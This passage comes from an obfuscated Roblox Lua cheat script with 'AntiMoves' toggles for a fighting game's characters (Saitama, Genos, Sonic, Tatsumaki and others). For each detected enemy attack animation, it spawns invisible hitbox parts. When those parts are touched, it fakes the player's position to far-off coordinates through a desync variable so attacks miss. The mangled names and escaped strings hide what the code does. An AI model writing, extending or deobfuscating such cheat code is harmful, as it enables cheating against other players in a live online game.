 if _IlllIllIII:match("\049\053\054\055\054\048\055\050\052\054\057") and rawget(_IlIllIIllI.AntiMoves_AtomicSamurai.Value, "\065\110\116\105\032\083\111\108\097\114\032\067\108\101\097\118\101") then local _IIIIIlIlll, isTouched, cleanup = _IIlIIlIIll(Vector3.new(0x32,0xA,0x96)) local _IIlIIllIIl = tick() repeat _IIIIIlIlll.CFrame = _IllllllIlI.CFrame * CFrame.new(0x0,0x0,-0x4B) if isTouched() and not _lIlIIIIllI(_lIlllIllll) then getgenv().desync = { CFrame = _IIIlIlIIlI } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _IIlIIllIIl + 0x2 or not _llIIllIlIl.IsPlaying getgenv().desync = nil cleanup() end
 if _IlllIllIII:match("\049\054\048\053\055\052\049\049\056\056\056") and rawget(_IlIllIIllI.AntiMoves_AtomicSamurai.Value, "\065\110\116\105\032\065\116\111\109\105\099\032\083\108\097\115\104\032\070\105\110\105\115\104\101\114") then task.wait(4.25) local _IIlIIllIIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x32 or tick() >= _IIlIIllIIl + 0x2 end
 ) end
 if _IlllIllIII:match("\049\056\052\051\053\053\051\053\050\057\049") and rawget(_IlIllIIllI.AntiMoves_Suiryu.Value, "\065\110\116\105\032\083\117\105\114\121\117\032\085\108\116") then task.wait(4.25) local _IIlIIllIIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x64 or tick() >= _IIlIIllIIl + 1.25 end
 ) end
 if _IlllIllIII:match("\049\055\056\053\055\055\056\056\053\057\056") and rawget(_IlIllIIllI.AntiMoves_Suiryu.Value, "\065\110\116\105\032\087\104\105\114\108\119\105\110\100\032\068\114\111\112") then task.wait(0.65) if _llIIllIlIl.IsPlaying then local _llIIIIlllI = Instance.new("\080\097\114\116", workspace) _llIIIIlllI.Anchored = true _llIIIIlllI.Size = Vector3.new(0x23, 0x800, 0x23) _llIIIIlllI.CanCollide = false _llIIIIlllI.Transparency = 0x1 local _IlllIIllll = false local _IlIlIllIll = _llIIIIlllI.Touched:Connect( function (_IlIIIIlIIl) if _IlIIIIlIIl == _IIIlIIIllI or _IlIIIIlIIl == getgenv().InvisPart30 then _IlllIIllll = true end
 end
 ) local _lIllllIIll = _llIIIIlllI.TouchEnded:Connect( function (_IlIIIIlIIl) if _IlIIIIlIIl == _IIIlIIIllI or _IlIIIIlIIl == getgenv().InvisPart30 then _IlllIIllll = false end
 end
 ) local _IIlIIllIIl = tick() repeat _llIIIIlllI.CFrame = _IllllllIlI.CFrame if _IlllIIllll and not _IIlIlIIlIl(_IlIlllIlIl, "\049\053\049\050\056\056\052\057\048\052\055") then getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _IIlIIllIIl + 0.85 or not _llIIllIlIl.IsPlaying getgenv().desync = nil _IlIlIllIll:Disconnect() _lIllllIIll:Disconnect() pcall( function () _llIIIIlllI:Destroy() end
 ) end
 end
 if _IlllIllIII:match("\049\050\057\054\053\049\052\048\048\056\057\056\057\048\054") and rawget(_IlIllIIllI.AntiMoves_Suiryu.Value, "\065\110\116\105\032\071\114\097\110\100\032\070\105\115\115\117\114\101") then task.wait(0.5) local _lIlIIlIIII = _IllllllIlI.CFrame local _IIlIIllIIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x4B or tick() >= _IIlIIllIIl + 1.25 or not _llIIllIlIl.IsPlaying end
 ) task.wait(0x1) local _IIlIllIIlI = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _lIlIIlIIII.Position).Magnitude > 0x4B or tick() >= _IIlIllIIlI + 1.75 end
 ) end
 if _IlllIllIII:match("\049\056\056\057\054\050\050\057\051\050\049") and rawget(_IlIllIIllI.AntiMoves_Suiryu.Value, "\065\110\116\105\032\084\119\105\110\032\070\097\110\103\115") then local _IIlIIllIIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0xF or _lIlIlIIIIl(_IlIlllIlIl) or tick() >= _IIlIIllIIl + 3.5 or not _llIIllIlIl.IsPlaying end
 ) task.wait(0x1) if _llIIllIlIl.IsPlaying then if (_lIlllllIlI() - _IllllllIlI.Position).Magnitude <= 0x19 then local _IIlIllIIlI = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x19 or tick() >= _IIlIllIIlI + 0x2 or not _llIIllIlIl.IsPlaying end
 ) end
 end
 end
 if _IlllIllIII:match("\049\056\056\057\055\049\049\057\053\048\051") and rawget(_IlIllIIllI.AntiMoves_Suiryu.Value, "\065\110\116\105\032\069\097\114\116\104\032\083\112\108\105\116\116\105\110\103\032\083\116\114\105\107\101") then local _IIlIIllIIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x32 or tick() >= _IIlIIllIIl + 1.5 end
 ) end
 if _IlllIllIII:match("\049\048\054\055\053\053\052\053\057\048\057\050\052\051\054") or _IlllIllIII:match("\055\053\053\048\050\048\049\048\049\050\054\054\052\048") then MoveNotify(_lllIIlllll, "\076\097\115\116\032\066\114\101\097\116\104") end
 if (_IlllIllIII:match("\049\048\054\055\053\053\052\053\057\048\057\050\052\051\054") or _IlllIllIII:match("\055\053\053\048\050\048\049\048\049\050\054\054\052\048")) and rawget(_IlIllIIllI.AntiMoves_Suiryu.Value, "\065\110\116\105\032\076\097\115\116\032\066\114\101\097\116\104") then local _IIlIIllIIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x32 or tick() >= _IIlIIllIIl + 0x2 end
 ) end
 if _IlllIllIII:match("\049\054\053\049\053\056\053\048\049\053\051") and rawget(_IlIllIIllI.AntiMoves_Tatsumaki.Value, "\065\110\116\105\032\087\105\110\100\115\116\111\114\109\032\070\117\114\121") then task.spawn( function () if (_lIlllllIlI() - _IllllllIlI.Position).Magnitude <= 0xF then getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } end
 local _lIlIIlIIIl = workspace.Thrown:WaitForChild("\068\111\116\116\101\100", 0x1) if _lIlIIlIIIl then local _IlllIlllII = _lIlIIlIIIl:WaitForChild("\068\111\116\115", 0x1) if not _IlllIlllII then getgenv().desync = nil return end
 local _IIlIIllIIl = tick() if (_lIlllllIlI() - _IlllIlllII.Position).Magnitude > 0x14 then getgenv().desync = nil end
 _lIIlIlllIl( function () return (_lIlllllIlI() - _IlllIlllII.Position).Magnitude > 0x14 or _lIlIIIIllI(_lIlllIllll) or tick() >= _IIlIIllIIl + 4.25 end
 ) else getgenv().desync = nil end
 end
 ) end
 if _IlllIllIII:match("\049\054\052\051\049\052\057\049\050\049\053") and rawget(_IlIllIIllI.AntiMoves_Tatsumaki.Value, "\065\110\116\105\032\083\116\111\110\101\032\071\114\097\118\101") then local _IIlIIllIIl = tick() repeat task.wait() until (_lIlllllIlI() - (_IllllllIlI.CFrame * CFrame.new(0x0, 0x0, -0x19)).Position).Magnitude <= 0x19 or _IIlIlIIlIl(_IlIlllIlIl, "\049\053\049\050\056\056\052\057\048\052\055") or tick() >= _IIlIIllIIl + 0.75 if not _IIlIlIIlIl(_IlIlllIlIl, "\049\053\049\050\056\056\052\057\048\052\055") then _lIIlIlllIl( function () return (_lIlllllIlI() - (_IllllllIlI.CFrame * CFrame.new(0x0, 0x0, -0x14)).Position).Magnitude > 0x19 or _IIlIlIIlIl(_IlIlllIlIl, "\049\053\049\050\056\056\052\057\048\052\055") or tick() >= _IIlIIllIIl + 0.75 end
 ) end
 end
 if _IlllIllIII:match("\049\054\053\057\055\057\049\050\048\056\054") and rawget(_IlIllIIllI.AntiMoves_Tatsumaki.Value, "\065\110\116\105\032\069\120\112\117\108\115\105\118\101\032\080\117\115\104") then local _IIlIIllIIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0xF or _lIlIlIIIIl(_IlIlllIlIl) or tick() >= _IIlIIllIIl + 0.75 end
 ) end
 if _IlllIllIII:match("\049\055\050\055\053\049\053\048\056\048\057") and rawget(_IlIllIIllI.AntiMoves_Tatsumaki.Value, "\065\110\116\105\032\084\101\114\114\105\098\108\101\032\084\111\114\110\097\100\111") then local _IIlIIllIIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x32 or tick() >= _IIlIIllIIl + 0x1 end
 ) end
 if _IlllIllIII:match("\049\055\050\055\056\052\049\053\056\053\051") and _IIllllIlII:GetAttribute("\067\104\097\114\097\099\116\101\114") == "\069\115\112\101\114" and rawget(_IlIllIIllI.AntiMoves_Tatsumaki.Value, "\065\110\116\105\032\084\101\114\114\105\098\108\101\032\084\111\114\110\097\100\111") then task.wait(0xB) local _IIlIIllIIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x64 or tick() >= _IIlIIllIIl + 0x6 end
 ) end
 if _IlllIllIII:match("\049\054\055\051\052\053\056\052\052\055\056") and rawget(_IlIllIIllI.AntiMoves_Tatsumaki.Value, "\065\110\116\105\032\084\097\116\115\117\109\097\107\105\032\085\108\116") then local _IIlIIllIIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x4B or tick() >= _IIlIIllIIl + 5.75 end
 ) end
 if _IlllIllIII:match("\049\051\051\055\054\056\054\057\052\055\049") and rawget(_IlIllIIllI.AntiMoves_Sonic.Value, "\065\110\116\105\032\070\108\097\115\104\032\083\116\114\105\107\101") then local _llIIIIlllI = Instance.new("\080\097\114\116", workspace) _llIIIIlllI.Anchored = true _llIIIIlllI.Size = Vector3.new(0xA, 7.5, 0x3C) _llIIIIlllI.CanCollide = false _llIIIIlllI.Transparency = 0x1 local _IlllIIllll = false local _IlIlIllIll = _llIIIIlllI.Touched:Connect( function (_IlIIIIlIIl) if _IlIIIIlIIl == _IIIlIIIllI or _IlIIIIlIIl == getgenv().InvisPart30 then _IlllIIllll = true end
 end
 ) local _lIllllIIll = _llIIIIlllI.TouchEnded:Connect( function (_IlIIIIlIIl) if _IlIIIIlIIl == _IIIlIIIllI or _IlIIIIlIIl == getgenv().InvisPart30 then _IlllIIllll = false end
 end
 ) local _IIlIIllIIl = tick() repeat _llIIIIlllI.CFrame = _IllllllIlI.CFrame * CFrame.new(0x0, 0x0, -_llIIIIlllI.Size.Z / 0x2) RunService.RenderStepped:Wait() until _IlllIIllll or tick() >= _IIlIIllIIl + 0x3 or not _llIIllIlIl.IsPlaying if _IlllIIllll then local _IIlIllIIlI = tick() _lIIlIlllIl( function () return not _IlllIIllll or tick() >= _IIlIllIIlI + 0x1 or not _llIIllIlIl.IsPlaying end
 ) end
 _IlIlIllIll:Disconnect() _lIllllIIll:Disconnect() pcall( function () _llIIIIlllI:Destroy() end
 ) end
 if _IlllIllIII:match("\049\051\050\057\052\055\057\048\050\053\048") and rawget(_IlIllIIllI.AntiMoves_Sonic.Value, "\065\110\116\105\032\087\104\105\114\108\119\105\110\100\032\075\105\099\107") then task.wait(0.5) local _IIlIIllIIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - (_IllllllIlI.CFrame * CFrame.new(0x0, 0x0, -2.5)).Position).Magnitude > 0xA or _lIlIlIIIIl(_IlIlllIlIl) or tick() >= _IIlIIllIIl + 0.75 end
 ) end
 if _IlllIllIII:match("\049\051\054\051\050\051\052\055\051\054\054") and rawget(_IlIllIIllI.AntiMoves_Sonic.Value, "\065\110\116\105\032\084\119\105\110\098\108\097\100\101\032\082\117\115\104") then local _IIlIIllIIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x4B or _lIlIIIIllI(_lIlllIllll) or tick() >= _IIlIIllIIl + 1.75 or not _llIIllIlIl.IsPlaying end
 ) end
 if _IlllIllIII:match("\049\051\055\050\051\049\055\052\048\055\056") and rawget(_IlIllIIllI.AntiMoves_Sonic.Value, "\065\110\116\105\032\067\097\114\110\097\103\101") then task.wait(0.5) local _IIlIIllIIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x32 or tick() >= _IIlIIllIIl + 0x2 or not _llIIllIlIl.IsPlaying end
 ) end
 if _IlllIllIII:match("\049\051\056\056\049\051\051\053\055\049\051") and rawget(_IlIllIIllI.AntiMoves_Sonic.Value, "\065\110\116\105\032\070\111\117\114\102\111\108\100\032\070\108\097\115\104\115\116\114\105\107\101") then task.wait(0.75) if _llIIllIlIl.IsPlaying then local _llIIIIlllI = Instance.new("\080\097\114\116", workspace) _llIIIIlllI.Anchored = true _llIIIIlllI.Size = Vector3.new(0x23, 0x5, 0x3C) _llIIIIlllI.CanCollide = false _llIIIIlllI.Transparency = 0x1 local _IlllIIllll = false local _IlIlIllIll = _llIIIIlllI.Touched:Connect( function (_IlIIIIlIIl) if _IlIIIIlIIl == _IIIlIIIllI or _IlIIIIlIIl == getgenv().InvisPart30 then _IlllIIllll = true end
 end
 ) local _lIllllIIll = _llIIIIlllI.TouchEnded:Connect( function (_IlIIIIlIIl) if _IlIIIIlIIl == _IIIlIIIllI or _IlIIIIlIIl == getgenv().InvisPart30 then _IlllIIllll = false end
 end
 ) local _IIlIIllIIl = tick() repeat _llIIIIlllI.CFrame = _IllllllIlI.CFrame * CFrame.new(0x0, 0x0, -_llIIIIlllI.Size.Z / 0x2) RunService.RenderStepped:Wait() until _IlllIIllll or tick() >= _IIlIIllIIl + 0x3 or not _llIIllIlIl.IsPlaying if _IlllIIllll then local _IIlIllIIlI = tick() _lIIlIlllIl( function () return not _IlllIIllll or tick() >= _IIlIllIIlI + 0x1 or not _llIIllIlIl.IsPlaying end
 ) end
 _IlIlIllIll:Disconnect() _lIllllIIll:Disconnect() pcall( function () _llIIIIlllI:Destroy() end
 ) end
 end
 if _IlllIllIII:match("\049\052\055\050\049\056\051\055\050\052\053") and rawget(_IlIllIIllI.AntiMoves_Genos.Value, "\065\110\116\105\032\084\104\117\110\100\101\114\032\075\105\099\107") then local _IIlIIllIIl = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x19 or _IIlIlIIlIl(_IlIlllIlIl, "\049\053\049\050\056\056\052\057\048\052\055") or tick() >= _IIlIIllIIl + 1.5 or not _llIIllIlIl.IsPlaying end
 ) if tick() >= _IIlIIllIIl + 1.5 then task.wait(0x1) local _IIlIllIIlI = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x64 or tick() >= _IIlIllIIlI + 1.5 or not _llIIllIlIl.IsPlaying end
 ) end
 end
 if _IlllIllIII:match("\049\051\048\056\051\051\051\050\055\052\050") and rawget(_IlIllIIllI.AntiMoves_Genos.Value, "\065\110\116\105\032\070\108\097\109\101\119\097\118\101\032\067\097\110\110\111\110") then task.wait(0x1) local _llIIIIlllI = Instance.new("\080\097\114\116", workspace) _llIIIIlllI.Anchored = true _llIIIIlllI.Size = Vector3.new(12.5, 0x5, 0x3E8) _llIIIIlllI.CanCollide = false _llIIIIlllI.Transparency = 0x1 task.delay(0.25, function () _llIIIIlllI.CFrame = _IllllllIlI.CFrame * CFrame.new(0x0, 0x0, -_llIIIIlllI.Size.Z / 0x2) end
 ) local _IlllIIllll = false local _IlIlIllIll = _llIIIIlllI.Touched:Connect( function (_IlIIIIlIIl) if _IlIIIIlIIl == _IIIlIIIllI or _IlIIIIlIIl == getgenv().InvisPart30 then _IlllIIllll = true end
 end
 ) local _lIllllIIll = _llIIIIlllI.TouchEnded:Connect( function (_IlIIIIlIIl) if _IlIIIIlIIl == _IIIlIIIllI or _IlIIIIlIIl == getgenv().InvisPart30 then _IlllIIllll = false end
 end
 ) local _IIlIIllIIl = tick() repeat if _IlllIIllll and not _lIlIIIIllI(_lIlllIllll) then getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _IIlIIllIIl + 0x4 or not _llIIllIlIl.IsPlaying getgenv().desync = nil _IlIlIllIll:Disconnect() _lIllllIIll:Disconnect() pcall( function () _llIIIIlllI:Destroy() end
 ) end
 if _IlllIllIII:match("\049\051\049\052\054\055\049\048\055\054\050") and rawget(_IlIllIIllI.AntiMoves_Genos.Value, "\065\110\116\105\032\073\110\099\105\110\101\114\097\116\101") then task.wait(3.25) if _llIIllIlIl.IsPlaying then local _IlIlllIlII = {} local _IlllIIllII = { CFrame.new(0x32, 0x0, -0xC8) * CFrame.Angles(0x0, math.rad(-0xF), 0x0), CFrame.new(-0x32, 0x0, -0xC8) * CFrame.Angles(0x0, math.rad(0xF), 0x0), CFrame.new(0x0, 0x0, -0xC8), } local _IlllIIllll = false local _llIIlllIll = {} for _lllIlllIIl, off in ipairs(_IlllIIllII) do local _IIIIIlIlll = Instance.new("\080\097\114\116", workspace) _IIIIIlIlll.Anchored = true _IIIIIlIlll.Size = Vector3.new(0x64, 0x4B, 0x190) _IIIIIlIlll.CanCollide = false _IIIIIlIlll.Transparency = 0x1 _IIIIIlIlll.CFrame = _IllllllIlI.CFrame * off table.insert(_IlIlllIlII, _IIIIIlIlll) table.insert(_llIIlllIll, _IIIIIlIlll.Touched:Connect( function (_IlIIIIlIIl) if _IlIIIIlIIl == _IIIlIIIllI or _IlIIIIlIIl == getgenv().InvisPart30 then _IlllIIllll = true end
 end
 )) table.insert(_llIIlllIll, _IIIIIlIlll.TouchEnded:Connect( function (_IlIIIIlIIl) if _IlIIIIlIIl == _IIIlIIIllI or _IlIIIIlIIl == getgenv().InvisPart30 then _IlllIIllll = false end
 end
 )) end
 local _IIlIIllIIl = tick() repeat if _IlllIIllll and not _lIlIIIIllI(_lIlllIllll) then getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _IIlIIllIIl + 0x6 or not _llIIllIlIl.IsPlaying getgenv().desync = nil for _lllIlllIIl, _IIIlIlllll in ipairs(_llIIlllIll) do _IIIlIlllll:Disconnect() end
 for _lllIlllIIl, _IIIIIlIlll in ipairs(_IlIlllIlII) do pcall( function () _IIIIIlIlll:Destroy() end
 ) end
 end
 end
 if _IlllIllIII:match("\049\055\049\052\049\049\053\051\048\057\057") and rawget(_IlIllIIllI.AntiMoves_KJ.Value, "\065\110\116\105\032\083\116\111\105\099\032\066\111\109\098") then task.delay(0x2, function () local _IIlIIllIIl = tick() repeat task.wait() until (_lIlllllIlI() - _IllllllIlI.Position).Magnitude <= 0x4B or tick() >= _IIlIIllIIl + 1.5 if (_lIlllllIlI() - _IllllllIlI.Position).Magnitude <= 0x4B then local _IIlIllIIlI = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x4B or tick() >= _IIlIllIIlI + 1.5 end
 ) end
 end
 ) end
 if _IlllIllIII:match("\049\055\051\053\052\057\055\054\048\054\055") and rawget(_IlIllIIllI.AntiMoves_KJ.Value, "\065\110\116\105\032\050\048\045\050\048\045\050\048\032\068\114\111\112\107\105\099\107") then task.delay(0x1, function () local _llIIIIlllI = Instance.new("\080\097\114\116", workspace) _llIIIIlllI.Anchored = true _llIIIIlllI.Size = Vector3.new(0x19, 0x5, 0x7D) _llIIIIlllI.CanCollide = false _llIIIIlllI.Transparency = 0x1 local _IlllIIllll = false local _IlIlIllIll = _llIIIIlllI.Touched:Connect( function (_IlIIIIlIIl) if _IlIIIIlIIl == _IIIlIIIllI or _IlIIIIlIIl == getgenv().InvisPart30 then _IlllIIllll = true end
 end
 ) local _lIllllIIll = _llIIIIlllI.TouchEnded:Connect( function (_IlIIIIlIIl) if _IlIIIIlIIl == _IIIlIIIllI or _IlIIIIlIIl == getgenv().InvisPart30 then _IlllIIllll = false end
 end
 ) local _IIlIIllIIl = tick() repeat _llIIIIlllI.CFrame = _IllllllIlI.CFrame * CFrame.new(0x0, 0x0, -_llIIIIlllI.Size.Z / 0x2) RunService.RenderStepped:Wait() until _IlllIIllll or tick() >= _IIlIIllIIl + 0x5 or not _llIIllIlIl.IsPlaying if _IlllIIllll then local _IIlIllIIlI = tick() _lIIlIlllIl( function () return not _IlllIIllll or tick() >= _IIlIllIIlI + 1.5 or not _llIIllIlIl.IsPlaying end
 ) end
 _IlIlIllIll:Disconnect() _lIllllIIll:Disconnect() pcall( function () _llIIIIlllI:Destroy() end
 ) end
 ) end
 if _IlllIllIII:match("\049\056\052\054\050\056\057\052\053\057\051") and rawget(_IlIllIIllI.AntiMoves_KJ.Value, "\065\110\116\105\032\070\105\118\101\032\083\101\097\115\111\110\115") then task.delay(6.75, function () local _IIlIIllIIl = tick() _lIIlIlllIl( function () return tick() >= _IIlIIllIIl + 0x1 end
 ) end
 ) end
 if _IlllIllIII:match("\049\048\048\053\053\056\053\056\057\051\048\055\048\048\054") and rawget(_IlIllIIllI.AntiMoves_FrozenSoul.Value, "\065\110\116\105\032\080\101\114\109\097\102\114\111\115\116") then task.wait(0.35) if _llIIllIlIl.IsPlaying then local _llIIIIlllI = Instance.new("\080\097\114\116", workspace) _llIIIIlllI.Anchored = true _llIIIIlllI.Size = Vector3.new(0x2D, 0x19, 0x55) _llIIIIlllI.CanCollide = false _llIIIIlllI.Transparency = 0x1 local _IlllIIllll = false local _IlIlIllIll = _llIIIIlllI.Touched:Connect( function (_IlIIIIlIIl) if _IlIIIIlIIl == _IIIlIIIllI or _IlIIIIlIIl == getgenv().InvisPart30 then _IlllIIllll = true end
 end
 ) local _lIllllIIll = _llIIIIlllI.TouchEnded:Connect( function (_IlIIIIlIIl) if _IlIIIIlIIl == _IIIlIIIllI or _IlIIIIlIIl == getgenv().InvisPart30 then _IlllIIllll = false end
 end
 ) local _IIlIIllIIl = tick() repeat _llIIIIlllI.CFrame = _IllllllIlI.CFrame * CFrame.new(0x0, 0x0, -_llIIIIlllI.Size.Z / 0x2) if _IlllIIllll and not _IIlIlIIlIl(_IlIlllIlIl, "\049\053\049\050\056\056\052\057\048\052\055") then getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } else getgenv().desync = nil end
 task.wait() until tick() >= _IIlIIllIIl + 0.65 or not _llIIllIlIl.IsPlaying getgenv().desync = nil _IlIlIllIll:Disconnect() _lIllllIIll:Disconnect() pcall( function () _llIIIIlllI:Destroy() end
 ) end
 end
 if _IlllIllIII:match("\049\051\055\053\054\049\053\049\049\055\054\056\056\054\049") and rawget(_IlIllIIllI.AntiMoves_FrozenSoul.Value, "\065\110\116\105\032\070\114\111\115\116\032\070\111\114\103\101") then task.delay(0x1, function () local _IIlIIllIIl = tick() repeat task.wait() until (_lIlllllIlI() - _IllllllIlI.Position).Magnitude <= 0x96 or tick() >= _IIlIIllIIl + 0.75 if (_lIlllllIlI() - _IllllllIlI.Position).Magnitude <= 0x96 then local _IIlIllIIlI = tick() _lIIlIlllIl( function () return (_lIlllllIlI() - _IllllllIlI.Position).Magnitude > 0x96 or tick() >= _IIlIllIIlI + 0.75 end
 ) end
 end
 ) end
 if _IlllIllIII:match("\049\049\050\054\050\048\051\054\053\050\052\048\050\051\053") and rawget(_IlIllIIllI.AntiMoves_FrozenSoul.Value, "\065\110\116\105\032\070\114\101\101\122\105\110\103\032\080\097\116\104") then task.wait(0.5) if _llIIllIlIl.IsPlaying then local _llIIIIlllI = Instance.new("\080\097\114\116", workspace) _llIIIIlllI.Anchored = true _llIIIIlllI.Size = Vector3.new(0x14, 0xA, 0x23) _llIIIIlllI.CanCollide = false _llIIIIlllI.Transparency = 0x1 local _IlllIIllll = false local _IlIlIllIll = _llIIIIlllI.Touched:Connect( function (_IlIIIIlIIl) if _IlIIIIlIIl == _IIIlIIIllI or _IlIIIIlIIl == getgenv().InvisPart30 then _IlllIIllll = true end
 end
 ) local _lIllllIIll = _llIIIIlllI.TouchEnded:Connect( function (_IlIIIIlIIl) if _IlIIIIlIIl == _IIIlIIIllI or _IlIIIIlIIl == getgenv().InvisPart30 then _IlllIIllll = false end
 end
 ) local _IIlIIllIIl = tick() repeat _llIIIIlllI.CFrame = _IllllllIlI.CFrame * CFrame.new(0x0, 0x0, -_llIIIIlllI.Size.Z / 0x2) if _IlllIIllll and not _IIlIlIIlIl(_IlIlllIlIl, "\049\053\049\050\056\056\052\057\048\052\055") then getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } else getgenv().desync = nil end
 task.wait() until tick() >= _IIlIIllIIl + 0x4 or not _llIIllIlIl.IsPlaying getgenv().desync = nil _IlIlIllIll:Disconnect() _lIllllIIll:Disconnect() pcall( function () _llIIIIlllI:Destroy() end
 ) end
 end
 if _IlllIllIII:match("\055\053\053\052\055\053\057\048\051\051\053\055\055\052") and rawget(_IlIllIIllI.AntiMoves_FrozenSoul.Value, "\065\110\116\105\032\074\117\100\103\101\109\101\110\116\032\067\104\097\105\110") then task.wait(0.35) if _llIIllIlIl.IsPlaying then local _llIIIIlllI = Instance.new("\080\097\114\116", workspace) _llIIIIlllI.Anchored = true _llIIIIlllI.Size = Vector3.new(0xA, 0x5, 0xAF) _llIIIIlllI.CanCollide = false _llIIIIlllI.Transparency = 0x1 local _IlllIIllll = false local _IlIlIllIll = _llIIIIlllI.Touched:Connect( function (_IlIIIIlIIl) if _IlIIIIlIIl == _IIIlIIIllI or _IlIIIIlIIl == getgenv().InvisPart30 then _IlllIIllll = true end
 end
 ) local _lIllllIIll = _llIIIIlllI.TouchEnded:Connect( function (_IlIIIIlIIl) if _IlIIIIlIIl == _IIIlIIIllI or _IlIIIIlIIl == getgenv().InvisPart30 then _IlllIIllll = false end
 end
 ) local _IIlIIllIIl = tick() repeat _llIIIIlllI.CFrame = _IllllllIlI.CFrame * CFrame.new(0x0, 0x0, -_llIIIIlllI.Size.Z / 0x2) if _IlllIIllll and not _IIlIlIIlIl(_IlIlllIlIl, "\049\053\049\050\056\056\052\057\048\052\055") then getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } else getgenv().desync = nil end
 task.wait() until tick() >= _IIlIIllIIl + 0x1 or not _llIIllIlIl.IsPlaying getgenv().desync = nil _IlIlIllIll:Disconnect() _lIllllIIll:Disconnect() pcall( function () _llIIIIlllI:Destroy() end
 ) end
 end
 if _IlllIllIII:match("\049\049\051\052\051\051\049\056\049\051\052") and rawget(_IlIllIIllI.AntiMoves_Saitama.Value, "\065\110\116\105\032\068\101\097\116\104\032\067\111\117\110\116\101\114\032\083\104\111\099\107\119\097\118\101") then task.wait(7.5) if not _llIIllIlIl.IsPlaying then return end
 local _IlIlllIlII = {} local _IlllIIllII = { CFrame.new(0x3C, 0x0, -0xFA) * CFrame.Angles(0x0, math.rad(-0xF), 0x0), CFrame.new(-0x3C, 0x0, -0xFA) * CFrame.Angles(0x0, math.rad(0xF), 0x0), CFrame.new(0x0, 0x0, -0xFA), } local _IlllIIllll = {false, false, false} local _llIIlllIll = {} for _lIllIIIIII, off in ipairs(_IlllIIllII) do local _IIIIIlIlll = Instance.new("\080\097\114\116", workspace) _IIIIIlIlll.Anchored = true _IIIIIlIlll.Size = Vector3.new(0x7D, 0x5, 0x1F4) _IIIIIlIlll.CanCollide = false _IIIIIlIlll.Transparency = 0x1 table.insert(_IlIlllIlII, _IIIIIlIlll) local _lIlllIlIll = _lIllIIIIII table.insert(_llIIlllIll, _IIIIIlIlll.Touched:Connect( function (_IlIIIIlIIl) if _IlIIIIlIIl == _IIIlIIIllI or _IlIIIIlIIl == getgenv().InvisPart30 then _IlllIIllll[_lIlllIlIll] = true end
 end
 )) table.insert(_llIIlllIll, _IIIIIlIlll.TouchEnded:Connect( function (_IlIIIIlIIl) if _IlIIIIlIIl == _IIIlIIIllI or _IlIIIIlIIl == getgenv().InvisPart30 then _IlllIIllll[_lIlllIlIll] = false end
 end
 )) end
 local _IIlIIllIIl = tick() repeat for _lIllIIIIII, _IIIIIlIlll in ipairs(_IlIlllIlII) do _IIIIIlIlll.CFrame = _IllllllIlI.CFrame * _IlllIIllII[_lIllIIIIII] end
 if _IlllIIllll[0x1] or _IlllIIllll[0x2] or _IlllIIllll[0x3] then getgenv().desync = { CFrame = CFrame.new(9e9, 9e9, 9e9) } else getgenv().desync = nil end
 RunService.RenderStepped:Wait() until tick() >= _IIlIIllIIl + 2.5 or not _llIIllIlIl.IsPlaying getgenv().desync = nil for _lllIlllIIl, _IIIlIlllll in ipairs(_llIIlllIll) do _IIIlIlllll:Disconnect() end
 for _lllIlllIIl, _IIIIIlIlll in ipairs(_IlIlllIlII) do pcall( function () _IIIIIlIlll:Destroy() end
 ) end
 end
 end
 ) end
 ) _IlIlllIlII[_lllIIlllll] = _IllIIIllII end
 _IIllIIllII = function (_lllIIlllll) if _lllIIlllll == _llIIIlIIll then return end
 if _lllIIlllll.Character then task.spawn(_IlIIIIIIlI, _lllIIlllll, _lllIIlllll.Character) end
 local _IIIlIlllll = _lllIIlllll.CharacterAdded:Connect( function (_IIllllIlII) task.spawn(_IlIIIIIIlI, _lllIIlllll, _IIllllIlII) end
 ) _llIllIIlIl[_lllIIlllll] = _IIIlIlllll end
 for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do task.spawn(_IIllIIllII, _IIIIIlIlll) end
 local _IIlllIIlll = Players.PlayerAdded:Connect( function (_IIIIIlIlll) if _IIIIIlIlll == _llIIIlIIll then return end
